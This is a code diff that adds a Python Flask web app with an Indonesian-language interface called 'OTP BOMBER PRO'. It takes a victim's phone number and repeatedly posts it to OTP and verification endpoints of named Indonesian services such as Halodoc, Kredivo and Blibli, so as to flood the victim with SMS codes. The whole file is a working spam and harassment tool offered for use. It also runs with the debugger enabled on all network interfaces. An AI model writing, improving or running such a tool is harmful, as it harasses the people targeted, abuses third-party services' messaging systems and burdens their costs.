@@ -1,0 +1,127 @@
+from flask import Flask, render_template_string, request, jsonify
+import requests
+import random
+import time
+
+app = Flask(__name__)
+
+HTML_CODE = """
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP BOMBER PRO</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:#0a0a0a;font-family:'Courier New',monospace;padding:20px;min-height:100vh;display:flex;justify-content:center;align-items:center;}
+        .card{max-width:500px;width:100%;background:#0f0f1a;border:2px solid #00ffaa;border-radius:30px;padding:25px;}
+        h1{color:#00ffaa;text-align:center;margin-bottom:10px;}
+        input,button{width:100%;padding:12px;margin:10px 0;background:#1a1a2a;border:1px solid #00ffaa;color:#00ffaa;border-radius:25px;}
+        button{background:#00ffaa;color:#000;font-weight:bold;cursor:pointer;}
+        .log{background:#000;border-radius:15px;padding:15px;height:300px;overflow-y:auto;font-size:11px;margin-top:15px;}
+        .success{color:#0f0;}
+        .error{color:#f00;}
+        .info{color:#0ff;}
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>💀 OTP SPAM PRO 💀</h1>
+    <p style="text-align:center;color:#0fa;">✓ NO CORS • NO PROXY</p>
+    
+    <input type="text" id="target" placeholder="6281234567890">
+    <input type="number" id="loop" placeholder="Jumlah" value="3">
+    <input type="number" id="delay" placeholder="Delay (ms)" value="500">
+    
+    <button id="startBtn">🔥 START SPAM</button>
+    <button id="stopBtn" style="background:#f00;color:#fff;" disabled>🛑 STOP</button>
+    
+    <div class="log" id="log"></div>
+</div>
+
+<script>
+    let isRunning = false, stopFlag = false;
+    const logDiv = document.getElementById('log');
+    
+    function addLog(msg, type) {
+        const time = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `<div class="${type}">[${time}] ${msg}</div>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+    
+    async function startSpam() {
+        if(isRunning) return;
+        let target = document.getElementById('target').value;
+        let loop = parseInt(document.getElementById('loop').value);
+        let delay = parseInt(document.getElementById('delay').value);
+        
+        isRunning = true; stopFlag = false;
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+        
+        addLog(`🚀 Start spam ke ${target}`, 'info');
+        
+        for(let i=0; i<loop && !stopFlag; i++) {
+            const res = await fetch('/api/spam', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({target: target, round: i+1, otp: Math.floor(100000+Math.random()*900000)})
+            });
+            const data = await res.json();
+            if(data.success) addLog(`✅ Kirim ke ${data.endpoint}`, 'success');
+            else addLog(`❌ Gagal`, 'error');
+            if(delay > 0 && !stopFlag) await new Promise(r => setTimeout(r, delay));
+        }
+        
+        if(stopFlag) addLog('⛔ Dihentikan', 'error');
+        else addLog('✅ Selesai!', 'success');
+        
+        isRunning = false;
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+    }
+    
+    function stopSpam() { if(isRunning) { stopFlag = true; addLog('🛑 Menghentikan...', 'error'); } }
+    
+    document.getElementById('startBtn').onclick = startSpam;
+    document.getElementById('stopBtn').onclick = stopSpam;
+</script>
+</body>
+</html>
+"""
+
+ENDPOINTS = [
+    "https://api.cloudmi.id/v1/otp/send",
+    "https://api.naturalfram.com/api/send-verification",
+    "https://api.kitakilat.com/v1/otp/request",
+    "https://api.klikdokter.com/v1/auth/otp",
+    "https://api.halodoc.com/v1/otp/send",
+    "https://api.kredivo.com/v1/otp/request",
+    "https://api.akulaku.com/v1/otp/send",
+    "https://api.bibit.id/v1/otp/request",
+    "https://api.ajaib.co.id/v1/otp/send",
+    "https://api.blibli.com/v1/otp/send"
+]
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_CODE)
+
+@app.route('/api/spam', methods=['POST'])
+def spam():
+    data = request.json
+    target = data.get('target')
+    otp = data.get('otp')
+    
+    for ep in ENDPOINTS:
+        try:
+            requests.post(ep, json={"phone": target, "otp": otp}, timeout=3)
+            return jsonify({"success": True, "endpoint": ep.split('/')[2]})
+        except:
+            continue
+    return jsonify({"success": False})
+
+if __name__ == '__main__':
+    print("🚀 Server running at http://localhost:5000")
+    app.run(host='0.0.0.0', port=5000, debug=True)
